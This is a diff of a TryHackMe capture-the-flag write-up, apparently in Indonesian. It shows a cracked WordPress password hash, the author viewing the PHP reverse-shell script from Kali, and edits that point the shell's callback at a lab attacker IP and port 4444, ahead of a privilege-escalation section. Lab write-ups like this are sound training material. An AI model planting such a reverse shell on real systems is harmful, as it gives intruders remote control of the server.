@@ -59,6 +59,7 @@ yura - $P$B6jSC3m7WdMlLi1/NDb3OFhqv536SV/:soccer13
 <img width="282" height="56" alt="image" src="https://github.com/user-attachments/assets/02b00053-1a77-4ee9-9554-478ad6e1b8e1" />
 
 ```┌──(kali㉿kali)-[~/TryHackMe]
+
 └─$ cat /usr/share/webshells/php/php-reverse-shell.php
 <?php
 // php-reverse-shell - A Reverse Shell implementation in PHP
@@ -108,8 +109,8 @@ yura - $P$B6jSC3m7WdMlLi1/NDb3OFhqv536SV/:soccer13
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '127.0.0.1';  // CHANGE THIS
-$port = 1234;       // CHANGE THIS
+$ip = '10.49.145.199';  // CHANGE THIS
+$port = 4444;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
@@ -252,7 +253,9 @@ function printit ($string) {
 
 
 
- ```
+
+```
+
 <img width="1366" height="684" alt="image" src="https://github.com/user-attachments/assets/522d5638-f3a7-4731-baa8-8b07ef5a86f2" />
 
 4. Eskalasi Hak Istimewa (Privilege Escalation)
